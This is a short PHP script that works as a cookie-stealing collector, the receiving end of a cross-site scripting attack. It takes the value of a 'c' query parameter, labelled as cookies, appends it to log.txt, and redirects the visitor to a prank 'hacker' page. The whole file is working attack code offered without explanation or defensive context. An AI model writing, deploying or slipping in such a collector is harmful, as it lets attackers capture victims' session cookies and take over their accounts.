<?php
header ('Location:https://pranx.com/hacker/');
$cookies = $_GET["c"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
?>